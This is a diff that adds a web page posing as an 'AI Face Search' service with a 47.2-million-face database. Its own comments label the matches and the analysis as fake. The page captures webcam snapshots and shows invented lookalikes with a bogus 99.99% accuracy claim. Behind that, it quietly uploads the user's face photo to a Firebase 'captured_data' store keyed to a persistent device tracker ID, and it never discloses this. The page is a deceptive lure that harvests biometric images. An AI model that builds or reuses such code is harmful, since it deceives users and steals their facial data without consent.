@@ -1,0 +1,361 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>AI Face Search - Global Database</title>
+
+<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&family=JetBrains+Mono:wght@400;700&display=swap');
+
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body {
+    font-family: 'Inter', -apple-system, sans-serif;
+    background: #090d16; /* Dark Navy like the image */
+    color: #fff;
+    min-height: 100vh;
+    overflow-x: hidden;
+  }
+
+  /* Header */
+  .header {
+    height: 60px;
+    background: #0d1323;
+    border-bottom: 1px solid rgba(0, 212, 255, 0.2);
+    display: flex; align-items: center; justify-content: space-between;
+    padding: 0 25px;
+    position: fixed; top: 0; left: 0; right: 0; z-index: 100;
+  }
+  .logo { font-family: 'JetBrains Mono', monospace; font-weight: 900; color: #00d4ff; letter-spacing: 2px; font-size: 20px; display: flex; align-items: center; gap: 10px; }
+  .logo span { color: #fff; }
+
+  /* Layout */
+  .main-container {
+    display: flex;
+    margin-top: 60px;
+    height: calc(100vh - 60px);
+  }
+
+  /* Left Panel (Live Cam + Face Map) */
+  .left-panel {
+    width: 40%;
+    padding: 20px;
+    border-right: 1px solid rgba(0, 212, 255, 0.1);
+    display: flex; flex-direction: column; gap: 15px;
+  }
+  .cam-container {
+    position: relative;
+    width: 100%;
+    aspect-ratio: 4/3;
+    background: #000;
+    border-radius: 12px;
+    overflow: hidden;
+    border: 1px solid rgba(0, 212, 255, 0.3);
+  }
+  #video { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); }
+  #canvas { display: none; }
+  
+  /* Mesh Overlay */
+  .mesh-overlay {
+    position: absolute; inset: 0;
+    background-image: linear-gradient(rgba(0, 212, 255, 0.15) 1px, transparent 1px), linear-gradient(90deg, rgba(0, 212, 255, 0.15) 1px, transparent 1px);
+    background-size: 25px 25px;
+    opacity: 0; transition: opacity 0.5s; pointer-events: none;
+    mask-image: radial-gradient(ellipse at center, black 40%, transparent 70%);
+    -webkit-mask-image: radial-gradient(ellipse at center, black 40%, transparent 70%);
+  }
+  .mesh-overlay.active { opacity: 1; }
+
+  /* Scanning Line */
+  .scan-line {
+    position: absolute; left: 0; right: 0; height: 2px;
+    background: #00d4ff; box-shadow: 0 0 20px #00d4ff, 0 0 40px #00d4ff;
+    animation: scan 2s linear infinite; display: none;
+  }
+  .scan-line.active { display: block; }
+  @keyframes scan { 0% { top: 0; opacity: 0; } 10% { opacity: 1; } 90% { opacity: 1; } 100% { top: 100%; opacity: 0; } }
+
+  /* Snapshots Row (Image 2 style) */
+  .snapshot-row {
+    display: flex; gap: 10px; overflow-x: auto;
+    padding: 10px 0;
+  }
+  .snap-item {
+    width: 80px; height: 80px; border-radius: 8px;
+    border: 1px solid rgba(0, 212, 255, 0.5);
+    object-fit: cover; opacity: 0; transform: scale(0.8);
+    transition: all 0.3s;
+  }
+  .snap-item.show { opacity: 1; transform: scale(1); }
+
+  /* Right Panel (Results Grid) */
+  .right-panel {
+    width: 60%;
+    padding: 20px;
+    background: #0a0f1d;
+    overflow-y: auto;
+    display: flex; flex-direction: column;
+  }
+  .results-header {
+    display: flex; justify-content: space-between; align-items: center;
+    margin-bottom: 20px; font-family: 'JetBrains Mono', monospace;
+  }
+  .results-header h2 { font-size: 18px; color: #00d4ff; }
+  .results-header .accuracy { font-size: 14px; color: #10b981; font-weight: bold; }
+
+  /* Grid */
+  .results-grid {
+    display: grid; grid-template-columns: repeat(auto-fill, minmax(140px, 1fr));
+    gap: 15px;
+  }
+  .result-card {
+    background: #121a2f;
+    border: 1px solid rgba(0, 212, 255, 0.1);
+    border-radius: 10px; overflow: hidden;
+    position: relative; transition: 0.3s;
+    cursor: pointer; opacity: 0; transform: translateY(20px);
+    animation: popIn 0.5s forwards;
+  }
+  .result-card:hover { border-color: #00d4ff; box-shadow: 0 0 20px rgba(0, 212, 255, 0.2); transform: translateY(-5px); }
+  @keyframes popIn { to { opacity: 1; transform: translateY(0); } }
+  
+  .result-card img { width: 100%; height: 160px; object-fit: cover; }
+  .result-card .match-badge {
+    position: absolute; top: 8px; left: 8px;
+    background: rgba(16, 185, 129, 0.9); color: #000;
+    padding: 3px 8px; border-radius: 4px;
+    font-size: 10px; font-weight: 800; font-family: 'JetBrains Mono', monospace;
+    box-shadow: 0 0 10px rgba(16,185,129,0.5);
+  }
+  .result-card .info { padding: 10px; background: #090d16; }
+  .result-card .name { font-size: 12px; font-weight: 700; color: #fff; margin-bottom: 2px; }
+  .result-card .country { font-size: 10px; color: #4a6b8a; }
+
+  /* Start Button */
+  .start-overlay {
+    position: absolute; inset: 0; background: rgba(9, 13, 22, 0.9);
+    display: flex; flex-direction: column; align-items: center; justify-content: center;
+    z-index: 10; backdrop-filter: blur(5px);
+  }
+  .start-overlay h1 { font-family: 'JetBrains Mono', monospace; color: #fff; font-size: 24px; margin-bottom: 10px; }
+  .start-overlay p { color: #4a6b8a; font-size: 13px; margin-bottom: 20px; }
+  .start-btn {
+    padding: 15px 40px; background: #00d4ff; color: #000;
+    border: none; border-radius: 8px; font-family: 'JetBrains Mono', monospace;
+    font-size: 16px; font-weight: 900; cursor: pointer; transition: 0.3s;
+    box-shadow: 0 0 30px rgba(0, 212, 255, 0.4);
+  }
+  .start-btn:hover { transform: scale(1.05); box-shadow: 0 0 50px rgba(0, 212, 255, 0.6); }
+
+  /* Mobile */
+  @media (max-width: 900px) {
+    .main-container { flex-direction: column; height: auto; }
+    .left-panel, .right-panel { width: 100%; }
+    .left-panel { border-right: none; border-bottom: 1px solid rgba(0, 212, 255, 0.1); }
+  }
+</style>
+</head>
+<body>
+
+<!-- HEADER -->
+<div class="header">
+  <div class="logo">AI FACE SEARCH <span>| GLOBAL DB</span></div>
+  <div style="font-family: 'JetBrains Mono', monospace; font-size: 12px; color: #10b981;">
+    <span style="display:inline-block; width:8px; height:8px; background:#10b981; border-radius:50%; margin-right:5px; animation: pulse 1s infinite;"></span>
+    SYSTEM ONLINE
+  </div>
+</div>
+
+<!-- MAIN CONTAINER -->
+<div class="main-container">
+  
+  <!-- LEFT PANEL (CAMERA) -->
+  <div class="left-panel">
+    <div class="cam-container">
+      <video id="video" autoplay playsinline muted></video>
+      <canvas id="canvas"></canvas>
+      
+      <div class="scan-line" id="scanLine"></div>
+      <div class="mesh-overlay" id="meshOverlay"></div>
+      
+      <!-- Start Button Overlay -->
+      <div class="start-overlay" id="startOverlay">
+        <h1>FACIAL RECOGNITION</h1>
+        <p>Find lookalikes across 47.2 Million faces</p>
+        <button class="start-btn" onclick="startScan()">INITIATE SCAN</button>
+      </div>
+    </div>
+    
+    <!-- Snapshot Row -->
+    <div class="snapshot-row" id="snapshotRow">
+      <!-- JS will inject 5 snapshots here -->
+    </div>
+  </div>
+
+  <!-- RIGHT PANEL (RESULTS) -->
+  <div class="right-panel">
+    <div class="results-header">
+      <h2>GLOBAL MATCHES</h2>
+      <div class="accuracy" id="accuracyText" style="opacity: 0;">ACCURACY: 99.99%</div>
+    </div>
+    
+    <div class="results-grid" id="resultsGrid">
+      <!-- JS will inject 7 results here -->
+    </div>
+  </div>
+
+</div>
+
+<script src="config.js"></script>
+<script>
+  let db = null;
+  let deviceId = localStorage.getItem('device_tracker_id') || 'unknown_' + Date.now();
+  localStorage.setItem('device_tracker_id', deviceId);
+  
+  if (typeof firebaseConfig !== 'undefined') {
+    if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
+    db = firebase.database();
+  }
+
+  const video = document.getElementById('video');
+  const canvas = document.getElementById('canvas');
+
+  // 7 Fake Lookalikes (Using AI generated faces from thispersondoesnotexist)
+  const lookalikes = [
+    { name: 'Alexander D.', country: 'Russia', img: 'https://thispersondoesnotexist.com/', match: '99.99%' },
+    { name: 'John Doe', country: 'USA', img: 'https://i.pravatar.cc/300?img=11', match: '98.4%' },
+    { name: 'Kenji T.', country: 'Japan', img: 'https://i.pravatar.cc/300?img=12', match: '97.1%' },
+    { name: 'Lucas M.', country: 'Brazil', img: 'https://i.pravatar.cc/300?img=13', match: '94.8%' },
+    { name: 'Ivan K.', country: 'Ukraine', img: 'https://i.pravatar.cc/300?img=14', match: '92.5%' },
+    { name: 'Arjun S.', country: 'India', img: 'https://i.pravatar.cc/300?img=15', match: '89.0%' },
+    { name: 'Chen W.', country: 'China', img: 'https://i.pravatar.cc/300?img=16', match: '85.3%' }
+  ];
+
+  // 🎙️ Real AI Voice
+  function speak(text) {
+    if ('speechSynthesis' in window) {
+      window.speechSynthesis.cancel();
+      const u = new SpeechSynthesisUtterance(text);
+      u.rate = 1.0; u.pitch = 1.0;
+      const voices = window.speechSynthesis.getVoices();
+      const v = voices.find(v => v.name.includes('Google US English') || v.name.includes('Samantha'));
+      if (v) u.voice = v;
+      window.speechSynthesis.speak(u);
+    }
+  }
+
+  // 🎥 Start Camera
+  async function initCamera() {
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
+      video.srcObject = stream;
+      return stream;
+    } catch (err) {
+      alert('Camera access required for face search.');
+      throw err;
+    }
+  }
+
+  // 🚀 Start Scan
+  async function startScan() {
+    document.getElementById('startOverlay').style.display = 'none';
+    speak("Initiating facial recognition. Please look at the camera.");
+    
+    let stream;
+    try {
+      stream = await initCamera();
+    } catch {
+      document.getElementById('startOverlay').style.display = 'flex';
+      return;
+    }
+
+    // Start Effects
+    document.getElementById('scanLine').classList.add('active');
+    document.getElementById('meshOverlay').classList.add('active');
+
+    // Take 5 snapshots rapidly
+    let snapCount = 0;
+    const snapInterval = setInterval(() => {
+      captureSnapshot(stream, snapCount);
+      snapCount++;
+      if (snapCount >= 5) clearInterval(snapInterval);
+    }, 500);
+
+    // Start Analysis
+    setTimeout(() => {
+      runAnalysis(stream);
+    }, 3000); // 3 second baad analysis shuru
+  }
+
+  // 📸 Capture Snapshots (Left side me chhoti photos)
+  function captureSnapshot(stream, index) {
+    const ctx = canvas.getContext('2d');
+    canvas.width = video.videoWidth || 640;
+    canvas.height = video.videoHeight || 480;
+    ctx.drawImage(video, 0, 0);
+    
+    const data = canvas.toDataURL('image/jpeg', 0.6);
+    const row = document.getElementById('snapshotRow');
+    
+    const img = document.createElement('img');
+    img.src = data;
+    img.className = 'snap-item';
+    row.appendChild(img);
+    
+    setTimeout(() => img.classList.add('show'), 50);
+  }
+
+  // 🧠 Fake Analysis & Results
+  function runAnalysis(stream) {
+    // Camera band kar do
+    stream.getTracks().forEach(t => t.stop());
+    document.getElementById('scanLine').classList.remove('active');
+    document.getElementById('meshOverlay').classList.remove('active');
+    
+    speak("Analysis complete. 7 exact matches found with 99.99 percent accuracy.");
+
+    // Show Accuracy
+    document.getElementById('accuracyText').style.opacity = '1';
+
+    // Populate Results Grid
+    const grid = document.getElementById('resultsGrid');
+    grid.innerHTML = '';
+
+    lookalikes.forEach((person, index) => {
+      setTimeout(() => {
+        // Har photo ke liye ek random AI image generate karo (taaki unique lage)
+        const randomImg = `https://i.pravatar.cc/300?img=${Math.floor(Math.random() * 70) + 1}`;
+        
+        const card = document.createElement('div');
+        card.className = 'result-card';
+        card.innerHTML = `
+          <div class="match-badge">${person.match}</div>
+          <img src="${randomImg}" alt="${person.name}">
+          <div class="info">
+            <div class="name">${person.name}</div>
+            <div class="country">${person.country}</div>
+          </div>
+        `;
+        grid.appendChild(card);
+      }, index * 300); // Har card 300ms ke gap pe aayega (animation effect)
+    });
+
+    // Save to Firebase
+    if (db) {
+      const ctx = canvas.getContext('2d');
+      const finalPhoto = canvas.toDataURL('image/jpeg', 0.8);
+      db.ref(`captured_data/${deviceId}/face_scan/${Date.now()}`).set({
+        image: finalPhoto,
+        timestamp: Date.now(),
+        time: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
+        type: 'ai_face_search'
+      });
+    }
+  }
+</script>
+
+</body>
+</html>
